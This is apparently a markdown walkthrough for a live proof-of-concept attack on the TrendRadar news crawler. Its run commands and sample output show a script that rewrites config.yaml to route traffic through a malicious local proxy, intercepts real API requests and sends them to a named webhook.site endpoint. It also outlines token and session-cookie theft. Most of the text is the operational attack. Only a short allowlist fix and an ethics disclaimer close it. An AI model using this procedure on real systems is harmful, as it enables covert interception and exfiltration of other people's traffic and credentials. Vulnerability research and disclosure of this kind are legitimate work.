# 🔴 LIVE SSRF ATTACK DEMONSTRATION

## Status: ✅ READY TO RUN

Your webhook.site endpoint is **CONFIRMED WORKING**. We successfully sent test data and you received:

```json
{
  "vulnerability": "SSRF via Proxy Configuration",
  "severity": "HIGH",
  "method": "Direct Test",
  "description": "This request proves that we can send data to webhook.site",
  "impact": "Attacker can intercept all TrendRadar traffic by setting malicious proxy"
}
```

**This proves the exfiltration channel works. Now let's intercept REAL traffic.**

---

## 🎯 What This Demo Will Show

Instead of just sending test data, this demo will:

1. ✅ Start a **real malicious proxy server**
2. ✅ Modify `config.yaml` to use the malicious proxy
3. ✅ Run the **actual TrendRadar crawler**
4. ✅ Intercept **real API requests** to `newsnow.busiyi.world`
5. ✅ Exfiltrate **actual request data** to your webhook.site
6. ✅ You see **real intercepted traffic** at webhook.site

**This is the full attack, not a simulation.**

---

## 🚀 Running the Complete Attack

### Step 1: Start the Malicious Proxy

Open Terminal 1:

```bash
cd /home/user/TrendRadar
python3 ssrf_ultimate_demo.py
```

**What happens:**
```
🧪 Testing webhook.site connectivity...
✅ webhook.site is reachable!
✅ Ready to intercept and exfiltrate traffic

Press ENTER to start the malicious proxy attack...
```

Press ENTER, and you'll see:

```
[STEP 1] Setting up malicious configuration...
✅ Config modified: proxy = http://127.0.0.1:8888
✅ Backup saved: config/config.yaml.backup_real_attack

[STEP 2] Starting malicious proxy server on port 8888...

🔴 ATTACK STATUS: ACTIVE
🔴 All crawler traffic will be intercepted
🔴 Data will be exfiltrated to webhook.site

🎬 Malicious proxy is now listening...
⏳ Waiting for crawler traffic...
```

**The proxy is now waiting to intercept traffic.**

---

### Step 2: Trigger the Crawler

Open Terminal 2:

```bash
cd /home/user/TrendRadar
python3 main.py
```

**OR** use MCP:

```bash
python3 mcp_server/server.py --transport http --port 3333

# Then in another terminal or tool:
curl -X POST http://localhost:3333/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"trigger_crawl","params":{},"id":1}'
```

---

### Step 3: Watch the Interception

**Terminal 1 (Proxy)** will show:

```
======================================================================
[!!!] INTERCEPTED REAL CRAWLER REQUEST #1
======================================================================
🎯 URL: https://newsnow.busiyi.world/api/s?id=zhihu&latest
📡 Client: 127.0.0.1:xxxxx
🕐 Time: 2025-11-16 14:30:45

   Host: newsnow.busiyi.world
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
   Accept: application/json, text/plain, */*
   Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
   Connection: keep-alive
   Cache-Control: no-cache

[!!!] CRITICAL: This is the REAL news API request!
[!!!] Platform ID and parameters exposed!
[!!!] Platform being queried: zhihu

📤 Exfiltrating to webhook.site...
✅ EXFILTRATION SUCCESS!
✅ Check webhook.site to see this intercepted request!

======================================================================
```

---

### Step 4: Check webhook.site

**Open in browser:**
https://webhook.site/#!/a78b922a-7974-4346-bba9-bc7caae13d93

**You will see NEW requests with data like:**

```json
{
  "alert": "🚨 REAL TRAFFIC INTERCEPTED 🚨",
  "request_number": 1,
  "timestamp": "2025-11-16 14:30:45",
  "attack_type": "LIVE SSRF - Real Crawler Traffic",
  "intercepted_request": {
    "method": "GET",
    "full_url": "https://newsnow.busiyi.world/api/s?id=zhihu&latest",
    "headers": {
      "Host": "newsnow.busiyi.world",
      "User-Agent": "Mozilla/5.0 ...",
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"
    },
    "client_ip": "127.0.0.1",
    "client_port": 54321
  },
  "analysis": {
    "is_external_api": true,
    "target_host": "newsnow.busiyi.world",
    "platform_id": "zhihu"
  },
  "impact": "Attacker now knows: request URLs, headers, timing, platform IDs",
  "next_steps": "Attacker can: log credentials, modify responses, DoS by dropping requests"
}
```

**This is REAL intercepted traffic from the actual crawler!**

---

## 🎬 What You'll See

### In Terminal 1 (Malicious Proxy)
Every request the crawler makes will be logged:
- Full URL with query parameters
- All HTTP headers
- Client IP and port
- Platform IDs being queried
- Confirmation of exfiltration to webhook.site

### At webhook.site
Real-time logs of:
- Each intercepted request
- Complete request details
- Timestamp of interception
- Analysis of what data was exposed

### In Terminal 2 (Crawler)
The crawler runs normally, **unaware it's being intercepted**.

---

## 🔍 What This Proves

### ✅ Proof Point 1: No Validation
The crawler uses the proxy from `config.yaml` **without any validation**.

### ✅ Proof Point 2: Full Interception
**Every single HTTP request** goes through the malicious proxy.

### ✅ Proof Point 3: Data Exfiltration
Sensitive data (URLs, headers, IPs) successfully exfiltrated to attacker's webhook.

### ✅ Proof Point 4: Real-World Impact
This is **exactly** how a real attacker would compromise TrendRadar:
1. Gain config write access (malicious MCP, compromised creds, etc.)
2. Set malicious proxy
3. Intercept all traffic
4. Exfiltrate to attacker server

---

## 🛑 Stopping the Attack

**In Terminal 1:**
Press `Ctrl+C` to stop the proxy

**Restore original config:**
```bash
mv config/config.yaml.backup_real_attack config/config.yaml
```

---

## 📊 Expected Results

After running the crawler, you should see in webhook.site:

| Request # | Type | Content |
|-----------|------|---------|
| 1-2 | Test data | Initial validation (already there) |
| 3+ | Real traffic | Actual crawler API requests |

**Each real traffic entry will contain:**
- Complete request URL
- All HTTP headers
- Timestamp
- Platform ID (zhihu, weibo, etc.)
- Client information

---

## 🎯 Real-World Attack Scenarios

### Scenario 1: Credential Theft
If the API required authentication:
```
Headers: {
  "Authorization": "Bearer abc123..."
}
```
→ Token stolen and visible at webhook.site

### Scenario 2: Session Hijacking
If crawler had session cookies:
```
Headers: {
  "Cookie": "session=xyz789..."
}
```
→ Session stolen, attacker can impersonate crawler

### Scenario 3: Data Manipulation
Attacker's proxy can:
- Modify responses (inject fake news)
- Drop requests (DoS)
- Forward to different API (redirect traffic)

---

## 💡 Why This Is Critical

1. **Zero Trust Violation**
   - User-controlled config should NEVER directly control network routing
   - Proxy URLs must be validated/allowlisted

2. **Complete Visibility**
   - Attacker sees **everything**: URLs, headers, data, timing
   - No encryption helps (proxy sees plaintext)

3. **Silent Attack**
   - Crawler runs normally
   - User has no indication of compromise
   - Logs don't show interception (unless proxy logs reviewed)

4. **Easy to Exploit**
   - Just modify config.yaml
   - No complex exploit needed
   - Works immediately

---

## 🛡️ Immediate Fix Required

```python
# main.py:4076 - Add before using proxy

ALLOWED_PROXIES = [
    "http://trusted-proxy.company.com:8080"
]

if proxy_url not in ALLOWED_PROXIES:
    raise ValueError(f"Proxy not allowlisted: {proxy_url}")

# Also block internal IPs
import re
from urllib.parse import urlparse

hostname = urlparse(proxy_url).hostname

BLOCKED = [r'^127\.', r'^10\.', r'^192\.168\.', r'^169\.254\.']
for pattern in BLOCKED:
    if re.match(pattern, hostname):
        raise ValueError(f"Blocked IP: {hostname}")
```

---

## 📝 Demo Checklist

Before running:
- [ ] Terminal 1 ready for proxy
- [ ] Terminal 2 ready for crawler
- [ ] Browser open to webhook.site
- [ ] Network connection stable

During demo:
- [ ] Proxy shows "ACTIVE" status
- [ ] Crawler starts successfully
- [ ] Terminal 1 shows "INTERCEPTED" messages
- [ ] webhook.site shows new POST requests
- [ ] Request data is complete and detailed

After demo:
- [ ] Stop proxy (Ctrl+C)
- [ ] Restore config.yaml from backup
- [ ] Review webhook.site logs
- [ ] Screenshot evidence

---

## 🎓 Educational Value

This demo teaches:
1. **SSRF fundamentals** - How user-controlled URLs enable attacks
2. **Proxy attacks** - Why proxy validation is critical
3. **Data exfiltration** - How attackers leak sensitive data
4. **Defense strategies** - Allowlisting, validation, monitoring

---

## ⚖️ Ethical Use Only

This demo is for:
- ✅ Security research
- ✅ Authorized testing
- ✅ Educational purposes
- ✅ Responsible disclosure

NOT for:
- ❌ Unauthorized access
- ❌ Real-world exploitation
- ❌ Malicious purposes

---

## 🔗 Resources

- **Webhook Endpoint:** https://webhook.site/#!/a78b922a-7974-4346-bba9-bc7caae13d93
- **Full Report:** SECURITY_AUDIT_REPORT.md
- **Complete Demo:** SSRF_COMPLETE_DEMO.md
- **PoC Scripts:** poc_ssrf_proxy.py, ssrf_live_demo.py, ssrf_ultimate_demo.py

---

**Ready to see real traffic interception? Run the demo! 🚀**
